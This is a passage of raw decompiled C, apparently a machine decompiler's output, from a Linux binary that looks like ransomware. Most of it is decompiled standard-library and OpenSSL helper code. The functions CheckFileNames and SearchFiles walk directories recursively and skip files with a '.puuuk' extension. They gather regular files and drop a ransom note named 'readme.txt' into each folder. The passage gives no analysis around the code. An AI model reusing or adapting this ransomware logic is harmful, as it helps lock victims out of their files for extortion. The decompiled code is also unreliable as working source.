    _ZNSt13move_iteratorIPSsEC1ES0_(&result, (int64_t *)a1);
    return result;
}

// Address range: 0x43185f - 0x431890
// Demangled:     std::string* std::__uninitialized_copy_a<std::move_iterator<std::string*>, std::string*, std::string>(std::move_iterator<std::string*>, std::move_iterator<std::string*>, std::string*, std::allocator<std::string>&)
int64_t * _ZSt22__uninitialized_copy_aISt13move_iteratorIPSsES1_SsET0_T_S4_S3_RSaIT1_E(int64_t a1, int64_t a2, int64_t * a3, int64_t * a4) {
    // 0x43185f
    return _ZSt18uninitialized_copyISt13move_iteratorIPSsES1_ET0_T_S4_S3_(a1, a2, a3);
}

// Address range: 0x431890 - 0x4318b5
// Demangled:     void std::_Destroy<std::string*>(std::string*, std::string*)
void _ZSt8_DestroyIPSsEvT_S1_(int64_t * a1, int64_t * a2) {
    // 0x431890
    _ZNSt12_Destroy_auxILb0EE9__destroyIPSsEEvT_S3_(a1, a2);
}

// Address range: 0x4318b5 - 0x4318c3
// Demangled:     std::__niter_base<std::string*, false>::__b(std::string*)
int64_t _ZNSt12__niter_baseIPSsLb0EE3__bES0_(int64_t * a1) {
    // 0x4318b5
    return (int64_t)a1;
}

// Address range: 0x4318c3 - 0x4318f4
// Demangled:     std::string* std::__copy_move_backward_a<true, std::string*, std::string*>(std::string*, std::string*, std::string*)
int64_t * _ZSt22__copy_move_backward_aILb1EPSsS0_ET1_T0_S2_S1_(int64_t * a1, int64_t * a2, int64_t * a3) {
    // 0x4318c3
    return _ZNSt20__copy_move_backwardILb1ELb0ESt26random_access_iterator_tagE13__copy_move_bIPSsS3_EET0_T_S5_S4_(a1, a2, a3);
}

// Address range: 0x4318f4 - 0x431902
// Demangled:     std::_Vector_base<std::string, std::allocator<std::string> >::_M_get_Tp_allocator() const
int64_t _ZNKSt12_Vector_baseISsSaISsEE19_M_get_Tp_allocatorEv(int64_t * result) {
    // 0x4318f4
    return (int64_t)result;
}

// Address range: 0x431902 - 0x431916
// Demangled:     __gnu_cxx::new_allocator<std::string>::max_size() const
int64_t _ZNK9__gnu_cxx13new_allocatorISsE8max_sizeEv(int64_t * result) {
    // 0x431902
    return 0x1fffffffffffffff;
}

// Address range: 0x431916 - 0x43192f
// Demangled:     std::move_iterator<std::string*>::move_iterator(std::string*)
int64_t _ZNSt13move_iteratorIPSsEC1ES0_(int64_t * result, int64_t * a2) {
    // 0x431916
    *result = (int64_t)a2;
    return (int64_t)result;
}

// Address range: 0x43192f - 0x43195c
// Demangled:     std::string* std::uninitialized_copy<std::move_iterator<std::string*>, std::string*>(std::move_iterator<std::string*>, std::move_iterator<std::string*>, std::string*)
int64_t * _ZSt18uninitialized_copyISt13move_iteratorIPSsES1_ET0_T_S4_S3_(int64_t a1, int64_t a2, int64_t * a3) {
    // 0x43192f
    return _ZNSt20__uninitialized_copyILb0EE18uninitialized_copyISt13move_iteratorIPSsES3_EET0_T_S6_S5_(a1, a2, a3);
}

// Address range: 0x43195c - 0x431990
// Demangled:     void std::_Destroy_aux<false>::__destroy<std::string*>(std::string*, std::string*)
void _ZNSt12_Destroy_auxILb0EE9__destroyIPSsEEvT_S3_(int64_t * a1, int64_t * a2) {
    if (a1 == a2) {
        // 0x43198e
        return;
    }
    int64_t v1 = (int64_t)a1; // 0x43197a
    _ZSt8_DestroyISsEvPT_((int64_t *)v1);
    v1 += 8;
    while (v1 != (int64_t)a2) {
        // 0x43196e
        _ZSt8_DestroyISsEvPT_((int64_t *)v1);
        v1 += 8;
    }
}

// Address range: 0x431990 - 0x4319fe
// Demangled:     std::string* std::__copy_move_backward<true, false, std::random_access_iterator_tag>::__copy_move_b<std::string*, std::string*>(std::string*, std::string*, std::string*)
int64_t * _ZNSt20__copy_move_backwardILb1ELb0ESt26random_access_iterator_tagE13__copy_move_bIPSsS3_EET0_T_S5_S4_(int64_t * a1, int64_t * a2, int64_t * result) {
    int64_t v1 = (int64_t)a2;
    int64_t v2 = v1 - (int64_t)a1; // 0x4319af
    if (v2 >= 0 != v2 >= 8) {
        // 0x4319f8
        return result;
    }
    int64_t v3 = v2 / 8; // 0x4319e7
    int64_t v4 = (int64_t)result; // 0x4319d3
    int64_t v5 = v1; // 0x4319bf
    v5 -= 8;
    _ZSt4moveIRSsEONSt16remove_referenceIT_E4typeEOS2_((int64_t **)v5);
    v4 -= 8;
    int64_t * result2 = (int64_t *)v4;
    _ZNSsaSERKSs(result2);
    v3--;
    while (v3 >= 0 == (v3 != 0)) {
        // 0x4319bf
        v5 -= 8;
        _ZSt4moveIRSsEONSt16remove_referenceIT_E4typeEOS2_((int64_t **)v5);
        v4 -= 8;
        result2 = (int64_t *)v4;
        _ZNSsaSERKSs(result2);
        v3--;
    }
    // 0x4319f8
    return result2;
}

// Address range: 0x4319fe - 0x431a72
// Demangled:     std::string* std::__uninitialized_copy<false>::uninitialized_copy<std::move_iterator<std::string*>, std::string*>(std::move_iterator<std::string*>, std::move_iterator<std::string*>, std::string*)
int64_t * _ZNSt20__uninitialized_copyILb0EE18uninitialized_copyISt13move_iteratorIPSsES3_EET0_T_S6_S5_(int64_t a1, int64_t a2, int64_t * a3) {
    int64_t v1 = (int64_t)a3;
    int64_t v2 = a1; // bp-56, 0x431a09
    int64_t v3 = a2; // bp-72, 0x431a0d
    if (!_ZStneIPSsS0_EbRKSt13move_iteratorIT_ERKS1_IT0_E(&v2, &v3)) {
        // 0x431a65
        return (int64_t *)v1;
    }
    int64_t v4 = v1; // 0x431a63
    int64_t * v5 = (int64_t *)_ZNKSt13move_iteratorIPSsEdeEv(&v2); // 0x431a38
    _ZSt10_ConstructISsSsEvPT_OT0_((int64_t *)v4, v5, v5);
    _ZNSt13move_iteratorIPSsEppEv(&v2);
    v4 += 8;
    bool v6 = _ZStneIPSsS0_EbRKSt13move_iteratorIT_ERKS1_IT0_E(&v2, &v3); // 0x431a5c
    while (v6) {
        // 0x431a1f
        v5 = (int64_t *)_ZNKSt13move_iteratorIPSsEdeEv(&v2);
        _ZSt10_ConstructISsSsEvPT_OT0_((int64_t *)v4, v5, v5);
        _ZNSt13move_iteratorIPSsEppEv(&v2);
        v4 += 8;
        v6 = _ZStneIPSsS0_EbRKSt13move_iteratorIT_ERKS1_IT0_E(&v2, &v3);
    }
    // 0x431a65
    return (int64_t *)v4;
}

// Address range: 0x431aaa - 0x431ac4
// Demangled:     void std::_Destroy<std::string>(std::string*)
void _ZSt8_DestroyISsEvPT_(int64_t * a1) {
    // 0x431aaa
    _ZNSsD1Ev();
}

// Address range: 0x431ac4 - 0x431aec
// Demangled:     bool std::operator!=<std::string*, std::string*>(std::move_iterator<std::string*> const&, std::move_iterator<std::string*> const&)
bool _ZStneIPSsS0_EbRKSt13move_iteratorIT_ERKS1_IT0_E(int64_t * a1, int64_t * a2) {
    // 0x431ac4
    return !_ZSteqIPSsS0_EbRKSt13move_iteratorIT_ERKS1_IT0_E(a1, a2);
}

// Address range: 0x431aec - 0x431b0c
// Demangled:     std::move_iterator<std::string*>::operator++()
int64_t _ZNSt13move_iteratorIPSsEppEv(int64_t * result) {
    int64_t result2 = (int64_t)result;
    *result = result2 + 8;
    return result2;
}

// Address range: 0x431b0c - 0x431b1d
// Demangled:     std::move_iterator<std::string*>::operator*() const
int64_t _ZNKSt13move_iteratorIPSsEdeEv(int64_t * result) {
    // 0x431b0c
    return (int64_t)result;
}

// Address range: 0x431b1d - 0x431b9b
// Demangled:     void std::_Construct<std::string, std::string>(std::string*, std::string&&)
void _ZSt10_ConstructISsSsEvPT_OT0_(int64_t * result, int64_t * a2, int64_t * a3) {
    // 0x431b1d
    _ZSt7forwardISsEOT_ONSt8identityIS0_E4typeE(a2);
    int64_t v1 = _ZnwmPv(8, result); // 0x431b4f
    if (v1 != 0) {
        // 0x431b5f
        _ZNSsC1ERKSs((int64_t *)v1);
    }
}

// Address range: 0x431b9b - 0x431bd4
// Demangled:     bool std::operator==<std::string*, std::string*>(std::move_iterator<std::string*> const&, std::move_iterator<std::string*> const&)
bool _ZSteqIPSsS0_EbRKSt13move_iteratorIT_ERKS1_IT0_E(int64_t * a1, int64_t * a2) {
    int64_t v1 = _ZNKSt13move_iteratorIPSsE4baseEv(a1); // 0x431bb3
    return v1 == _ZNKSt13move_iteratorIPSsE4baseEv(a2);
}

// Address range: 0x431bd4 - 0x431be5
// Demangled:     std::move_iterator<std::string*>::base() const
int64_t _ZNKSt13move_iteratorIPSsE4baseEv(int64_t * result) {
    // 0x431bd4
    return (int64_t)result;
}

// Address range: 0x431c54 - 0x431cec
// Demangled:     WriteFullData(int, unsigned char*, long)
int64_t _ZL13WriteFullDataiPhl(int32_t fd, char * a2, int32_t a3) {
    // 0x431c54
    if (a3 == 0) {
        // 0x431cea
        return 1;
    }
    int64_t v1 = 0; // 0x431c54
    int32_t nbyte = a3; // 0x431c54
    int64_t v2 = 0; // 0x431cca
    int32_t v3 = write(fd, (int64_t *)(v1 + (int64_t)a2), nbyte); // 0x431ca0
    int64_t result = 0; // 0x431cae
    while (v3 != 0 == (v3 != -1)) {
        int64_t v4 = v3; // 0x431ca0
        v2 += v4;
        v1 += v4;
        nbyte -= v3;
        result = 1;
        if (v2 == (int64_t)a3) {
            // break -> 0x431cea
            break;
        }
        v3 = write(fd, (int64_t *)(v1 + (int64_t)a2), nbyte);
        result = 0;
    }
    // 0x431cea
    return result;
}

// Address range: 0x431cec - 0x431e0e
// Demangled:     MakePath(std::string, std::string)
int64_t _ZL8MakePathSsSs(int64_t * result, int64_t a2, int64_t a3) {
    // 0x431cec
    _ZNKSs6lengthEv();
    char v1 = *(char *)_ZNSsixEm(a2); // 0x431d25
    int64_t * v2 = (int64_t *)a2;
    if (v1 != 47) {
        // 0x431d4f
        int64_t v3; // bp-56, 0x431cec
        _ZStplIcSt11char_traitsIcESaIcEESbIT_T0_T1_ERKS6_PKS3_(&v3, v2, "/");
        _ZStplIcSt11char_traitsIcESaIcEESbIT_T0_T1_ERKS6_S8_(result, &v3, (int64_t *)a3);
        _ZNSsD1Ev();
    } else {
        // 0x431d3a
        _ZStplIcSt11char_traitsIcESaIcEESbIT_T0_T1_ERKS6_S8_(result, v2, (int64_t *)a3);
    }
    // 0x431dfb
    return (int64_t)result;
}

// Address range: 0x431e0e - 0x431e9e
// Demangled:     CheckFileNames(std::string)
int64_t _Z14CheckFileNamesSs(int64_t a1) {
    // 0x431e0e
    if (strstr((char *)_ZNKSs5c_strEv(), ".puuuk") != NULL) {
        // 0x431e9c
        return 0;
    }
    int64_t v1 = _ZNKSs5c_strEv(); // 0x431e4b
    int64_t result = 0; // 0x431e64
    int64_t v2; // 0x431e0e
    if ((int32_t)function_42e6b0(v1, (int64_t)"readme.txt", v2) != 0) {
        // 0x431e6d
        result = strstr((char *)_ZNKSs5c_strEv(), ".sf") == NULL;
    }
    // 0x431e9c
    return result;
}

// Address range: 0x431e9e - 0x4324c5
// Demangled:     SearchFiles(std::string, void (*)(std::string, stat*))
int64_t _Z11SearchFilesSsPFvSsP4statE(int64_t * result, int64_t a2, void (*a3)(int64_t, int64_t *)) {
    struct __dirstream * dirp = opendir((char *)_ZNKSs5c_strEv()); // 0x431ee0
    if (dirp == NULL) {
        uint32_t v1 = *__errno_location(); // 0x431ef5
        // 0x4324b5
        int64_t v2; // 0x431e9e
        int64_t v3; // 0x431e9e
        int64_t v4; // 0x431e9e
        return _Z9LogPrintfPKcz("Cannot opendir %s errno = %d\n", _ZNKSs5c_strEv(), (int64_t)v1, v4, v3, v2);
    }
    // 0x431f1f
    int64_t v5; // bp-200, 0x431e9e
    _ZStplIcSt11char_traitsIcESaIcEESbIT_T0_T1_ERKS6_PKS3_(&v5, result, "/readme.txt");
    int32_t fd = open((char *)_ZNKSs5c_strEv(), 577); // 0x431f5e
    int64_t v6 = 384; // 0x431f6a
    if (fd != -1) {
        int32_t len = strlen((char *)_Z14GetDecryptNotev()); // 0x431f78
        _ZL13WriteFullDataiPhl(fd, (char *)_Z14GetDecryptNotev(), len);
        close(fd);
        v6 = len;
    }
    struct dirent * v7 = readdir(dirp); // 0x43245d
    if (v7 == NULL) {
        // 0x432476
        closedir(dirp);
        // 0x4324b5
        return _ZNSsD1Ev();
    }
    // 0x431fa7
    int64_t v8; // bp-168, 0x431e9e
    int64_t v9 = &v8;
    int64_t v10; // bp-104, 0x431e9e
    int64_t v11 = &v10;
    struct dirent * v12 = v7; // 0x43245d
    int64_t v13; // 0x431e9e
    int64_t v14; // 0x431fab
    while (true) {
        // 0x431fa7
        v13 = (int64_t)v12;
        v14 = v13 + 19;
        if ((int32_t)function_42e6b0(v14, (int64_t)&g1, v6) != 0) {
            // 0x431fc4
            if ((int32_t)function_42e6b0(v14, (int64_t)"..", v6) != 0) {
                // break -> 0x431fe1
                break;
            }
        }
        // 0x432456
        v12 = readdir(dirp);
        if (v12 == NULL) {
            // break (via goto) -> 0x432476
            goto lab_0x432476;
        }
    }
    char v15 = *(char *)(v13 + 18); // 0x431fe5
    int64_t v16; // 0x431e9e
    int64_t v17; // bp-120, 0x431e9e
    int64_t v18; // bp-121, 0x431e9e
    int64_t v19; // bp-136, 0x431e9e
    int64_t v20; // bp-152, 0x431e9e
    int64_t v21; // bp-184, 0x431e9e
    int64_t v22; // bp-216, 0x431e9e
    int64_t v23; // bp-232, 0x431e9e
    int64_t v24; // bp-88, 0x431e9e
    int64_t * v25; // 0x4321ee
    int64_t v26; // 0x432200
    int64_t * mem; // 0x432392
    if (v15 != 4) {
        // 0x4321b0
        v16 = v6;
        if (v15 == 8) {
            // 0x43227d
            _ZNSaIcEC1Ev();
            v25 = (int64_t *)v14;
            _ZNSsC1EPKcRKSaIcE((char *)&v19, v25);
            v26 = _Z14CheckFileNamesSs((int64_t)&v19);
            _ZNSsD1Ev();
            _ZNSaIcED1Ev();
            v16 = &v18;
            if ((char)v26 != 0) {
                // 0x432286
                _ZNSaIcEC1Ev();
                _ZNSsC1EPKcRKSaIcE((char *)&v17, v25);
                _ZNSsC1ERKSs(&v10);
                _ZL8MakePathSsSs(&v23, v11, (int64_t)&v17);
                _ZNSsD1Ev();
                _ZNSsD1Ev();
                _ZNSaIcED1Ev();
                mem = malloc(144);
                memset(mem, 0, 144);
                stat(_ZNKSs5c_strEv(), (int64_t)mem);
                _ZNSsC1ERKSs(&v24);
                _ZNSsD1Ev();
                _ZNSsD1Ev();
                v16 = &v24;
            }
        }
    } else {
        // 0x431ff1
        _ZNSaIcEC1Ev();
        _ZNSsC1EPKcRKSaIcE((char *)&v21, (int64_t *)v14);
        _ZNSsC1ERKSs(&v8);
        _ZL8MakePathSsSs(&v22, v9, (int64_t)&v21);
        _ZNSsD1Ev();
        _ZNSsD1Ev();
        _ZNSaIcED1Ev();
        _ZNSsC1ERKSs(&v20);
        _Z11SearchFilesSsPFvSsP4statE(&v20, a2, (void (*)(int64_t, int64_t *))a2);
        _ZNSsD1Ev();
        _ZNSsD1Ev();
        v16 = a2;
    }
    struct dirent * v27 = readdir(dirp); // 0x43245d
    while (v27 != NULL) {
        int64_t v28 = v16;
        v12 = v27;
        while (true) {
            // 0x431fa7
            v13 = (int64_t)v12;
            v14 = v13 + 19;
            int64_t v29 = function_42e6b0(v14, (int64_t)&g1, v28); // 0x431fb7
            if ((int32_t)v29 != 0) {
                // 0x431fc4
                if ((int32_t)function_42e6b0(v14, (int64_t)"..", v28) != 0) {
                    // break -> 0x431fe1
                    break;
                }
            }
            // 0x432456
            v12 = readdir(dirp);
            if (v12 == NULL) {
                // break (via goto) -> 0x432476
                goto lab_0x432476;
            }
        }
        // 0x431fe1
        v15 = *(char *)(v13 + 18);
        if (v15 != 4) {
            // 0x4321b0
            v16 = v28;
            if (v15 == 8) {
                // 0x43227d
                _ZNSaIcEC1Ev();
                v25 = (int64_t *)v14;
                _ZNSsC1EPKcRKSaIcE((char *)&v19, v25);
                v26 = _Z14CheckFileNamesSs((int64_t)&v19);
                _ZNSsD1Ev();
                _ZNSaIcED1Ev();
                v16 = &v18;
                if ((char)v26 != 0) {
                    // 0x432286
                    _ZNSaIcEC1Ev();
                    _ZNSsC1EPKcRKSaIcE((char *)&v17, v25);
                    _ZNSsC1ERKSs(&v10);
                    _ZL8MakePathSsSs(&v23, v11, (int64_t)&v17);
                    _ZNSsD1Ev();
                    _ZNSsD1Ev();
                    _ZNSaIcED1Ev();
                    mem = malloc(144);
                    memset(mem, 0, 144);
                    stat(_ZNKSs5c_strEv(), (int64_t)mem);
                    _ZNSsC1ERKSs(&v24);
                    _ZNSsD1Ev();
                    _ZNSsD1Ev();
                    v16 = &v24;
                }
            }
        } else {
            // 0x431ff1
            _ZNSaIcEC1Ev();
            _ZNSsC1EPKcRKSaIcE((char *)&v21, (int64_t *)v14);
            _ZNSsC1ERKSs(&v8);
            _ZL8MakePathSsSs(&v22, v9, (int64_t)&v21);
            _ZNSsD1Ev();
            _ZNSsD1Ev();
            _ZNSaIcED1Ev();
            _ZNSsC1ERKSs(&v20);
            _Z11SearchFilesSsPFvSsP4statE(&v20, a2, (void (*)(int64_t, int64_t *))a2);
            _ZNSsD1Ev();
            _ZNSsD1Ev();
            v16 = a2;
        }
        // 0x432456
        v27 = readdir(dirp);
    }
  lab_0x432476:
    // 0x432476
    closedir(dirp);
    // 0x4324b5
    return _ZNSsD1Ev();
}

// Address range: 0x4324c5 - 0x432533
// Demangled:     std::basic_string<char, std::char_traits<char>, std::allocator<char> > std::operator+<char, std::char_traits<char>, std::allocator<char> >(std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&)
int64_t _ZStplIcSt11char_traitsIcESaIcEESbIT_T0_T1_ERKS6_S8_(int64_t * result, int64_t * a2, int64_t * a3) {
    // 0x4324c5
    _ZNSsC1ERKSs(result);
    _ZNSs6appendERKSs(result);
    return (int64_t)result;
}

// Address range: 0x433ec0 - 0x433f81
int64_t RSA_private_decrypt(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int32_t a5) {
    int64_t v1 = FIPS_mode(); // 0x433eeb
    int64_t v2 = *(int64_t *)(a4 + 16);
    if ((int32_t)v1 == 0 || (*(char *)(v2 + 73) & 4) != 0 || (*(char *)(a4 + 117) & 4) != 0) {
        // 0x433f05
        return *(int64_t *)(v2 + 32);
    }
    // 0x433f3e
    ERR_put_error(4, 157, 149, "rsa_crpt.c", 109);
    return 0xffffffff;
}

// Address range: 0x434050 - 0x434111
int64_t RSA_public_encrypt(int64_t a1, int64_t * a2, int64_t * a3, int64_t a4, int64_t a5) {
    int64_t v1 = FIPS_mode(); // 0x43407b
    int64_t v2 = *(int64_t *)(a4 + 16);
    if ((int32_t)v1 == 0 || (*(char *)(v2 + 73) & 4) != 0 || (*(char *)(a4 + 117) & 4) != 0) {
        // 0x434095
        return *(int64_t *)(v2 + 8);
    }
    // 0x4340ce
    ERR_put_error(4, 153, 149, "rsa_crpt.c", 82);
    return 0xffffffff;
}

// Address range: 0x434120 - 0x43413e
int64_t RSA_size(int64_t a1) {
    // 0x434120
    return (int32_t)BN_num_bits(*(int64_t *)(a1 + 32)) / 0x4000;
}

// Address range: 0x434640 - 0x434748
int64_t BIO_gets(int64_t result, int64_t * a2, int64_t a3, int64_t a4, int64_t a5) {
    if (result == 0 || *(int64_t *)(result + 40) == 0) {
        // 0x434720
        ERR_put_error(32, 104, 121, "bio_lib.c", 297);
        // 0x4346d4
        return 0xfffffffe;
    }
    // 0x434681
    if ((int32_t)result < 1 == (*(int64_t *)(result + 8) != 0)) {
        // 0x4346d4
        return result;
    }
    int64_t result2 = result; // 0x4346a8
    if (*(int32_t *)(result + 24) == 0) {
        // 0x4346f0
        ERR_put_error(32, 104, 120, "bio_lib.c", 309);
        result2 = 0xfffffffe;
    }
    // 0x4346d4
    return result2;
}

// Address range: 0x434af0 - 0x434b87
int64_t BIO_free(int64_t a1) {
    // 0x434af0
    if (a1 == 0) {
        // 0x434b24
        return 0;
    }
    // 0x434afb
    if ((int32_t)CRYPTO_add_lock(a1 + 72, 0xffffffff, 21, "bio_lib.c", 117) >= 1) {
        // 0x434b24
        return 1;
    }
    int64_t v1 = *(int64_t *)(a1 + 8); // 0x434b30
    int64_t result = v1; // 0x434b37
    if (v1 != 0 != (int32_t)v1 < 1) {
        // 0x434b54
        CRYPTO_free_ex_data(0, a1, a1 + 96);
        result = 1;
    }
    // 0x434b24
    return result;
}

// Address range: 0x434b90 - 0x434bc0
int64_t BIO_free_all(int64_t a1) {
    // 0x434b90
    int64_t result; // 0x434b90
    if (a1 == 0) {
        // 0x434bb9
        return result;
    }
    int64_t v1 = a1;
    int64_t v2 = *(int64_t *)(v1 + 56); // 0x434bab
    result = BIO_free(v1);
    while (*(int32_t *)(v1 + 72) <= 1 && v2 != 0) {
        // 0x434ba8
        v1 = v2;
        v2 = *(int64_t *)(v1 + 56);
        result = BIO_free(v1);
    }
    // 0x434bb9
    return result;
}

// Address range: 0x434bd0 - 0x434ca1
int64_t BIO_set(int64_t a1, int64_t a2) {
    int64_t v1 = a1 + 96; // 0x434bd5
    *(int64_t *)a1 = a2;
    *(int64_t *)(a1 + 8) = 0;
    *(int64_t *)(a1 + 16) = 0;
    *(int32_t *)(a1 + 24) = 0;
    *(int32_t *)(a1 + 28) = 1;
    *(int32_t *)(a1 + 32) = 0;
    *(int32_t *)(a1 + 36) = 0;
    *(int32_t *)(a1 + 40) = 0;
    *(int64_t *)(a1 + 48) = 0;
    *(int64_t *)(a1 + 64) = 0;
    *(int64_t *)(a1 + 56) = 0;
    *(int32_t *)(a1 + 72) = 1;
    *(int64_t *)(a1 + 80) = 0;
    *(int64_t *)(a1 + 88) = 0;
    CRYPTO_new_ex_data(0, a1, v1);
    int64_t v2 = *(int64_t *)(a2 + 56); // 0x434c5f
    int64_t result = 1; // 0x434c66
    if (v2 != 0 == (int32_t)v2 == 0) {
        // 0x434c90
        CRYPTO_free_ex_data(0, a1, v1);
        result = 0;
    }
    // 0x434c76
    return result;
}

// Address range: 0x434cb0 - 0x434d33
int64_t BIO_new(int64_t a1) {
    // 0x434cb0
    int64_t v1; // 0x434cb0
    int64_t v2; // 0x434cb0
    int64_t v3 = CRYPTO_malloc(112, "bio_lib.c", 70, v2, v1); // 0x434cd2
    if (v3 == 0) {
        // 0x434d10
        ERR_put_error(32, 108, 65, "bio_lib.c", 73);
        // 0x434cee
        return 0;
    }
    int64_t v4 = BIO_set(v3, a1); // 0x434ce5
    int64_t result = v3; // 0x434cec
    if ((int32_t)v4 == 0) {
        // 0x434d00
        CRYPTO_free(v3, a1);
        result = 0;
    }
    // 0x434cee
    return result;
}

// Address range: 0x434e40 - 0x434e48
int64_t BIO_s_mem(void) {
    // 0x434e40
    return &g173;
}

// Address range: 0x434e50 - 0x434ed5
int64_t BIO_new_mem_buf(char * str, int64_t a2) {
    if (str == NULL) {
        // 0x434eb0
        ERR_put_error(32, 126, 115, "bss_mem.c", 100);
        // 0x434e94
        return 0;
    }
    int64_t len = 0x100000000 * a2 / 0x100000000; // 0x434e63
    if ((int32_t)a2 < 0) {
        // 0x434ea0
        len = strlen(str);
    }
    // 0x434e65
    BIO_new(BIO_s_mem());
    int64_t result = 0; // 0x434e75
    if (result != 0) {
        int64_t v1 = *(int64_t *)(result + 48); // 0x434e77
        int32_t * v2 = (int32_t *)(result + 32); // 0x434e7b
        *v2 = *v2 | 512;
        *(int32_t *)(result + 40) = 0;
        *(int64_t *)(v1 + 8) = (int64_t)str;
        *(int64_t *)v1 = len;
        *(int64_t *)(v1 + 16) = len;
    }
    // 0x434e94
    return result;
}

// Address range: 0x4354c0 - 0x4354e8
int64_t drbg_get_adin(int64_t a1, int64_t * a2) {
    // 0x4354c0
    FIPS_get_timevec(&g227, &g226);
    *a2 = (int64_t)&g227;
    return 16;
}

// Address range: 0x4356c0 - 0x4356ee
int64_t RAND_set_rand_method(int32_t a1) {
    // 0x4356c0
    if (g228 != 0) {
        // 0x4356d0
        ENGINE_finish(g228);
        g228 = 0;
    }
    // 0x4356e0
    g229 = a1;
    return 1;
}

// Address range: 0x435980 - 0x435ae0
int64_t RAND_init_fips(void) {
    int64_t v1 = __readfsqword(40); // 0x435986
    int64_t v2 = FIPS_get_default_drbg(); // 0x435996
    int64_t result; // 0x435980
    if ((int32_t)FIPS_drbg_init(v2, g175, g174) < 1) {
        // 0x435a80
        ERR_put_error(36, 109, 112, "rand_lib.c", 314);
        result = 0;
    } else {
        // 0x4359ba
        FIPS_drbg_set_callbacks(v2, 0x435520, 0x4354f0, 20, 0x435520, 0x4354f0);
        FIPS_drbg_set_rand_callbacks(v2, 0x4354c0, 0, 0x435460, 0x4353f0);
        int64_t v3 = 0x204c53536e65704f; // bp-72, 0x435a1b
        int64_t v4; // bp-80, 0x435980
        int64_t v5 = drbg_get_adin(v2, &v4); // 0x435a25
        int64_t v6; // bp-56, 0x435980
        __memcpy_chk(&v6, (int64_t *)v4, (int32_t)v5, 16);
        if ((int32_t)FIPS_drbg_instantiate(v2, &v3, 32) < 1) {
            // 0x435aa8
            ERR_put_error(36, 109, 113, "rand_lib.c", 330);
            result = 0;
        } else {
            // 0x435a54
            FIPS_rand_set_method(FIPS_drbg_method());
            result = 1;
        }
    }
    // 0x435a66
    if (v1 == __readfsqword(40)) {
        // 0x435a76
        return result;
    }
    // 0x435acd
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x435bf0 - 0x435c65
int64_t ERR_STATE_free(int64_t a1) {
    // 0x435bf0
    if (a1 == 0) {
        // 0x435c5e
        int64_t result; // 0x435bf0
        return result;
    }
    int64_t v1; // 0x435bf0
    for (int64_t i = 0; i < 61; i += 4) {
        int64_t * v2 = (int64_t *)(a1 + 208 + 2 * i); // 0x435c1d
        int64_t v3 = *v2; // 0x435c1d
        int64_t v4 = a1 + 336 + i;
        if (v3 != 0) {
            // 0x435c2a
            if (*(char *)v4 % 2 != 0) {
                // 0x435c34
                CRYPTO_free(v3, v1);
                *v2 = 0;
            }
        }
        // 0x435c08
        *(int32_t *)v4 = 0;
    }
    // 0x435c50
    return CRYPTO_free(a1, v1);
}

// Address range: 0x435c70 - 0x435ce0
int64_t err_fns_check(void) {
    // 0x435c70
    if (g230 != 0) {
        // 0x435c7e
        int64_t result; // 0x435c70
        return result;
    }
    // 0x435c88
    CRYPTO_lock(9, 1, "err.c", 295, (int64_t)&g299, (int64_t)&g299);
    if (g230 == 0) {
        // 0x435cd0
        g230 = &g80;
    }
    // 0x435cad
    return CRYPTO_lock(10, 1, "err.c", 298, (int64_t)&g299, (int64_t)&g299);
}

// Address range: 0x435d00 - 0x435d68
int64_t ERR_reason_error_string(int64_t a1) {
    // 0x435d00
    err_fns_check();
    int64_t result = 0; // 0x435d39
    if (g230 != 0) {
        // 0x435d3b
        result = *(int64_t *)(g230 + 8);
    }
    // 0x435d3f
    return result;
}

// Address range: 0x435d70 - 0x435dab
int64_t ERR_func_error_string(int64_t a1) {
    // 0x435d70
    err_fns_check();
    int64_t result = 0; // 0x435d9f
    if (g230 != 0) {
        // 0x435da1
        result = *(int64_t *)(g230 + 8);
    }
    // 0x435da5
    return result;
}

// Address range: 0x435db0 - 0x435deb
int64_t ERR_lib_error_string(int64_t a1) {
    // 0x435db0
    err_fns_check();
    int64_t result = 0; // 0x435ddf
    if (g230 != 0) {
        // 0x435de1
        result = *(int64_t *)(g230 + 8);
    }
    // 0x435de5
    return result;
}

// Address range: 0x436540 - 0x436660
int64_t ERR_get_state(void) {
    // 0x436540
    err_fns_check();
    int64_t v1; // bp-40, 0x436540
    CRYPTO_THREADID_current((int64_t)&v1);
    int64_t v2; // bp-648, 0x436540
    CRYPTO_THREADID_cpy(&v2, &v1);
    if (g230 != 0) {
        // 0x436580
        return g230;
    }
    // 0x436590
    int64_t v3; // 0x436540
    int64_t v4; // 0x436540
    int64_t v5 = CRYPTO_malloc(600, "err.c", 1019, v4, v3); // 0x4365a1
    if (v5 == 0) {
        // 0x436580
        return &g231;
    }
    // 0x4365b5
    CRYPTO_THREADID_cpy((int64_t *)v5, &v1);
    *(int32_t *)(v5 + 592) = 0;
    *(int32_t *)(v5 + 596) = 0;
    for (int64_t i = 0; i < 61; i += 4) {
        // 0x4365e0
        *(int64_t *)(v5 + 208 + 2 * i) = 0;
        *(int32_t *)(v5 + 336 + i) = 0;
    }
    // 0x436601
    ERR_STATE_free(v5);
    // 0x436580
    return g230 == v5 ? v5 : (int64_t)&g231;
}

// Address range: 0x436660 - 0x436745
int64_t ERR_pop_to_mark(void) {
    int64_t v1 = ERR_get_state(); // 0x436661
    int32_t * v2 = (int32_t *)(v1 + 592); // 0x436669
    uint32_t v3 = *v2; // 0x436669
    int32_t * v4 = (int32_t *)(v1 + 596); // 0x4366ab
    if (*v4 == v3) {
        // 0x436730
        return 0;
    }
    int64_t v5 = v1 + 208;
    int64_t v6 = v1 + 336;
    int32_t * v7 = (int32_t *)(v1 + 16 + 0x100000000 * (int64_t)v3 / 0x40000000);
    uint32_t v8 = *v7; // 0x4366b9
    if (v8 % 2 != 0) {
        // break (via goto) -> 0x436738
        goto lab_0x436738;
    }
    // 0x4366c1
    *v7 = 0;
    uint32_t v9 = *v2; // 0x4366c8
    int64_t v10 = v9; // 0x4366c8
    int64_t v11 = v9; // 0x4366ce
    int64_t v12 = 8 * v11; // 0x4366d1
    int64_t v13 = *(int64_t *)(v12 + v5); // 0x4366d1
    *(int64_t *)(v1 + 80 + v12) = 0;
    int64_t v14 = v10; // 0x4366e5
    int64_t v15; // 0x436660
    uint32_t v16; // 0x4366f6
    if (v13 != 0) {
        // 0x4366e7
        v14 = v10;
        if (*(char *)(4 * v11 + v6) % 2 != 0) {
            // 0x4366f1
            CRYPTO_free(v13, v15);
            v16 = *v2;
            *(int64_t *)(8 * (int64_t)v16 + v5) = 0;
